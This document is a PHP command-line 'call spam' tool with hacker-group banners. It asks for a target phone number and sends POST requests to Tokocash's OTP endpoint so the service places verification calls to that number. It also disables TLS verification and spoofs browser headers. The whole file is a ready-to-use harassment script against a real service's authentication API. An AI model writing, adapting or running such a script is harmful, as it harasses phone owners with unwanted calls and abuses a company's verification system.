<?php
function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=call");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "+-+-+-+-+ +-+-+-+-+    [ From Tokopedia ]
|C|A|L|L| |S|p|a|m|   Code By : ZeroSvn
+-+-+-+-+ +-+-+-+-+   Thanks  : BabbyCyberTeam
                                  SGB-TEAM
\n";

$white = "\e[97m";
$black = "\e[30m\e[1m";
$yellow = "\e[93m";
$orange = "\e[38;5;208m";
$blue   = "\e[34m";
$lblue  = "\e[36m";
$cln    = "\e[0m";
$green  = "\e[92m";
$fgreen = "\e[32m";
$red    = "\e[91m";
$magenta = "\e[35m";
$bluebg = "\e[44m";
$lbluebg = "\e[106m";
$greenbg = "\e[42m";
$lgreenbg = "\e[102m";
$yellowbg = "\e[43m";
$lyellowbg = "\e[103m";
$redbg = "\e[101m";
$grey = "\e[37m";
$cyan = "\e[36m";
$bold   = "\e[1m";

function banner(){

echo "\e[1m\e[1m\e[93m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
KON.TOOLS   \e[91m\e[91;7m\e[1m
 ____      _    _                   _  _    ___  _  _    
|  _ \ ___| | _(_)_ __   __ _      | || |  / _ \| || |   
| |_) / _ \ |/ / | '_ \ / _` |_____| || |_| | | | || |_  \e[0m\e[97;7m\e[1m
|  __/  __/   <| | | | | (_| |_____|__   _| |_| |__   _| 
|_|   \___|_|\_\_|_| |_|\__, |        |_|  \___/   |_|   
                        |___/   @peking_ceking           \e[0m
                          \e[1m\e[93m           Gua Ganteng Tq:)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
\e[0m\n";
}
system("clear");
banner();
echo $bold.$cyan. "Nomor Target? $cln$bold(hanya 3x perjam)\nInput : ";
$nomor = trim(fgets(STDIN));
$jumlah = "1";
$wait = "3";

print "\n";
$execute = tokcall($nomor, $jumlah, $wait);
print $execute;
print "$bold$green [BERHASIL] \n";
?>
